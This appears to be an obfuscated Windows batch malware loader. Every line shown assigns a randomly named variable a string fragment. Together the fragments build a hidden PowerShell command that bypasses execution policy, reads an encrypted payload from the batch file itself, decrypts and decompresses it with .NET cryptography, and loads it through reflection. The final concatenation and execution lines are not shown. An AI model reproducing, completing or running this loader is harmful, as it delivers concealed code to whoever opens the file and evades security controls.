@echo off
set "MORUIWWvrR=:\"
set "KJPicZrwgH=.e"
set "zddHwHQAHo=he"
set "TitMKfzYum=Po"
set "GPdYSjNLQh=Sy"
set "nBztQysOET=ll"
set "XXbUglYRxZ=s\"
set "BiZNcVWnLG=32"
set "KGjOVvWsMP=0\"
set "hCafdAawNI=nd"
set "NYAgiXKoFr=rs"
set "ERJywQBpDC=co"
set "TvAEHQoVEx=y "
set "gzcVundpNb=ll"
set "hXjKOTtsLa=py"
set "hwJatPBxPI=in"
set "BdRmLNfBdZ= C"
set "VzHIgUeBiw=st"
set "dxDUbULnDE=we"
set "UqfZPLgpxf=Wi"
set "dkGoyoVFLV= /"
set "XQQCRltsKK=ws"
set "uyycXYHypi=we"
set "XwMCoqFgii=rS"
set "RQGYSZtWyt=xe"
set "zsQlQlLtny=1."
set "DUdBNwwQxu=\v"
set "XRCpEBfmqs=po"
set "wiNePznaoA=he"
set "FuyUVxqsNm=\W"
set "LZlDQsfpcR=ow"
set "FRnGijBgYR=em"
set "IGMZFNATGk=do"
set "POrnKwJBsl=cd"
set "iuiaRjvknX= %~dp0"
set "TDcybLDhFr=ss -"
set "FwJRrDJlxQ=m(, "
set "LuCLDkJiLk=ect "
set "zXRgRnUCPx=nirt"
set "fGPAdaucNV=bypa"
set "RTlAwWkMWc=rtS4"
set "kgdOjYCSve=]::C"
set "DTFcOiUpSE=GICW"
set "eKvlcUzzoD=8kuY"
set "vrPRUDnHRB=$plS"
set "sMbzEaXpNn=$dfN"
set "iQZcndfFoz=);$h"
set "eaMsujoCvs=.-16"
set "BJOromvuge=kyhK"
set "bsmqRTYgPD=Ltju"
set "AzbNzQufyA=)($V"
set "XxcQbSFRcD=ddin"
set "IPUiDCWjjc=();$"
set "DqponQlSmr=oArr"
set "WQOswrdJyi=rofi"
set "FcwvrvmoLT=Stre"
set "UfnbpVUtpQ=$hLt"
set "AOaOPqGMre=$OFT"
set "BfYstsVYcb=('da"
set "RPlNvPfAYT=iron"
set "zBHnaqgrFK=)($z"
set "NJLbDjpJkK=ion."
set "qVuUeNIfYO= = $"
set "bIqZknApbb=Obje"
set "JbjpCEcktw=raph"
set "jMtFhAJofE=Disp"
set "qWmFpzWRfH=]::("
set "gvHnPbABEt=ptog"
set "PokDPjvpcP=flec"
set "NLmNByQeIQ=$vGI"
set "lAgQpuigyR=e = "
set "DCzmRLYBBl=] -j"
set "DvmxZALPci=m.IO"
set "pYDGWZfsCv=.Cry"
set "DSGViDwFoU=; };"
set "DmvNoUUevI=tem."
set "geEbyzHPqp= '')"
set "smMJFEDagj=y.Pa"
set "zMWhplRUuX=);$h"
set "bECVitinIk=hy.A"
set "wXwwyAIsCD=rity"
set "jRbGlSYwaq=u.Pa"
set "tisdCpcWiO=.Dis"
set "YfGNfJehPP=amZ "
set "TqxLRxTjvf=ert]"
set "JYTngzenVl=aDNK"
set "tLytFJaYOB== [S"
set "DkPdLTgTUY=;$AV"
set "BoEQVWEATD=Ltju"
set "BaNMughwHg=:('g"
set "NZaThsqLgz=();$"
set "ukcKKXwQoy=ct S"
set "qemexkGNME=.Cre"
set "mkHSfUvZsj=ay()"
set "VfOjfbeUUo=plST"
set "MNiVqHtrOm=HO3I"
set "iVMFniMYZu=m = "
set "wmRXRRVeKc=DNJS"
set "tegvzFBlir=ateD"
set "nZcMNCfVSb===')"
set "rQbAErlLqI=ing("
set "ylkbAVelHJ=lit("
set "nOKPfQxJjy=Xzm."
set "UHgNQSIqut=comp"
set "qFpXwlGKGu=rt]:"
set "weiBNbDwJC='[-1"
set "UMumBJrsuG=d;$h"
set "ZInfitjmyF=1] -"
set "ZaomfHFwTU=, (,"
set "ZtvdGEEKLR=$OFT"
set "NOXWlwHxgb=gth)"
set "FBEUkEdVnt=Ltju"
set "MPpfbZAiJS=mory"
set "tmTeAmbYRL=THxh"
set "jIFRcFKHcB=)))"
set "pLOJdbRsZI=.Dis"
set "ryopvktCnJ=.Com"
set "rftALrfGLk= [Sy"
set "elNNFNEHrj='oPV"
set "VwrEcQnFBo=3); "
set "PEnOeDLurC=ne);"
set "ZclkprmHxX=pher"
set "VcszNnDSuR=[Sys"
set "bitEHpiGFc=m.IO"
set "JFuKHyvPfa=]::N"
set "hpgTnfcTtM=-ep "
set "tbeDQtVnjB=.IO."
set "aFtPiFfBFH=-nop"
set "iGnLjaAEyD=Bmor"
set "ytWpEUvrda=)) {"
set "lVmXkmZltL=CuSj"
set "HxjHrNRctt=('%~f0'"
set "kmOfnTqYFl=ress"
set "jGjRfSMKGz=.Key"
set "aXEJrXoDBP=ptdk"
set "unackUaMnI=n ''"
set "KWBJJQEdpd=BC;$"
set "GceOhwxyzl=stem"
set "pysJryipMW=in $"
set "JKuEXVKNcP= = $"
set "udtpajjaPx=NdA "
set "yOgudOEKRU=.Cry"
set "KrPEecKJiS=7kGw"
set "SrYddEUygO=).Sp"
set "sHldajvwYZ=esaB"
set "FOscxsOjfi=orF'"
set "tFDkSckQir=Fina"
set "JHPJZejZFI=w, 0"
set "cWjhyFbaIo='')("
set "dJWVSYwRfi= if "
set "yHAcoleDzS=yste"
set "nQdZNzDuAs=zmgt"
set "mNQcxwhliq=$HBX"
